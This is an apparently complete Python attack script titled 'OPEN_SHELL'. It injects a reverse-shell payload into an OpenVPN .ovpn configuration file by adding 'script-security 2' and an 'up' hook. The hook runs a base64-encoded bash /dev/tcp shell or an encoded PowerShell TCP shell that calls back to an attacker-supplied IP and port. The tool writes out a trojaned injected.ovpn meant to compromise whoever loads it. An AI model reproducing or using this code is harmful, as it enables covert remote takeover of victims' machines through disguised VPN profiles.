import sys,os
from base64 import b64encode

print("[+] OPEN_SHELL #~")
print("[+] Gain a Reverse Shell Or Execute Command Using OpenVpn Config File")
print("[+] By 0xF55")


payload = ""
lin_payload = None
win_payload = None

try:
    file = sys.argv[1]
    ip = sys.argv[2]
    port = sys.argv[3]
    target_os = sys.argv[4]
except IndexError:
    print("[!] Usage python path_to_.ovpn ip port os")


print("[+] Generating Payload")
if target_os == "linux":
    # linux payload
    lin_payload = b64encode("bash -i >& /dev/tcp/{}/{} 0>&1".format(ip,port).encode())
    payload += 'up \"/bin/bash -c \'echo %s | base64 -d | bash\'\"\n' % lin_payload.decode()
elif target_os == "windows":
    # powershell payload
    powershell_code = (
        '$LHOST = "{}"; $LPORT = {}; '
        '$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); '
        '$NetworkStream = $TCPClient.GetStream(); '
        '$StreamReader = New-Object IO.StreamReader($NetworkStream); '
        '$StreamWriter = New-Object IO.StreamWriter($NetworkStream); '
        '$StreamWriter.AutoFlush = $true; '
        '$Buffer = New-Object System.Byte[] 1024; '
        'while ($TCPClient.Connected) {{ '
            'while ($NetworkStream.DataAvailable) {{ '
                '$RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); '
                '$Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) '
            '}}; '
            'if ($TCPClient.Connected -and $Code.Length -gt 1) {{ '
                '$Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; '
                '$StreamWriter.Write("$Output`n"); '
                '$Code = $null '
            '}} '
        '}}; '
        '$TCPClient.Close(); '
        '$NetworkStream.Close(); '
        '$StreamReader.Close(); '
        '$StreamWriter.Close();'
    ).format(ip, port)
    
    # UTF-16LE base64
    win_payload = b64encode(powershell_code.encode('utf-16le')).decode()
    
    payload += 'up "powershell -EncodedCommand {}"'.format(win_payload)

print("[+] "+payload)
sec = "script-security 2\n"

try:
    with open(file,"r") as r:
        data = r.read()
        path = os.path.join(os.path.dirname(file),"injected.ovpn")
        print("[+] Saving To {}".format(path))
        with open(path,"w") as w:
            w.write(sec)
            w.write(payload)
            w.write(data)
except FileNotFoundError:
    print("[!] File {} NotFound".format(file))
